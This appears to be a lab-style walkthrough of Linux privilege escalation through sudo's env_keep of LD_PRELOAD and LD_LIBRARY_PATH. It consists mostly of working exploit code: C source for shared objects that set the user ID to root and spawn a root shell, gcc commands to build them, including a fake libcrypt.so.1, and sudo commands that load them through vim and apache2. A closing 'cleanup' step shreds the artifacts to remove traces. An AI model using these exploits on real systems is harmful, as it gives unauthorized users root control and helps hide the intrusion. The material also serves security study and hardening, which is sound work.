# Living off the Land

## 01 - Detect

The second vulnerability in particular I would like to demonstrate that's regarding about.

```
user@debian:~$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
                                          
User user may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/sbin/apache2
```

## 02 - Exploit

```
user@debian:~$ cat preload.c
#include <stdlib.h>
#include <unistd.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0, 0, 0);
        system("/bin/bash -p");
}

user@debian:~$ cat preloadv2.c
#include <stdlib.h>
#include <unistd.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setgid(0);
        setuid(0);
        system("/bin/bash");
}
```

Most probably you'll compile the exploit as a x86-64 (64-bit) architecture. If you're targeting x86 (32-bit) Linux systems then you have to specify the `-m` flag either if it's `-m32` or `-m64`. You'll know right away when using the `file` command to check ELF binary architecture is based off.

```
user@debian:~$ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
```

Execute the `LD_PRELOAD` via `sudo` with any of the environment variables that has `(root) NOPASSWD`.

```
user@debian:~$ sudo LD_PRELOAD=/tmp/preload.so /usr/bin/vim

user@debian:~$ sudo LD_PRELOAD=/tmp/preload.so /usr/sbin/apache2

user@debian:~$ ldd /usr/sbin/apache2
        linux-vdso.so.1 =>  (0x00007fff503ff000)
        libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f048506b000)
        libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007f0484e47000)
        libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007f0484c0d000)
        libpthread.so.0 => /lib/libpthread.so.0 (0x00007f04849f1000)
        libc.so.6 => /lib/libc.so.6 (0x00007f0484685000)
        libuuid.so.1 => /lib/libuuid.so.1 (0x00007f0484480000)
        librt.so.1 => /lib/librt.so.1 (0x00007f0484278000)
        libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f0484041000)
        libdl.so.2 => /lib/libdl.so.2 (0x00007f0483e3c000)
        libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007f0483c14000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f0485528000)
```

We know that it's using `libcrypt.so.1 => /lib/libcrypt.so.1` if you don't know what it does do a bit of research with a help of internet and see who you can exploit the `sudo` environment.

```
user@debian:~$ cat > library_path.c << EOF
#include <stdlib.h>
#include <unistd.h>
  
static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
EOF

user@debian:~$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC library_path.c
```

> [!NOTE]
> Sometimes when you tried to get a reverse shell via `netcat` it's best to specify the full path of the binary.

Execute the `LD_LIBRARY_PATH` via `sudo` to get root.

```
user@debian:~$ sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2
```

## 03 - Cleanup

```
user@debian:~$ rm /tmp/preload.so /tmp/libcrypt.so.1 preload.c library_path.c

user@debian:~$ shred -uzxfvn 5 /tmp/preload.so /tmp/libcrypt.so.1 preload.c library_path.c
```

---
## References

### Hacktricks

- [Hacktricks: Privilege Escalation](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html)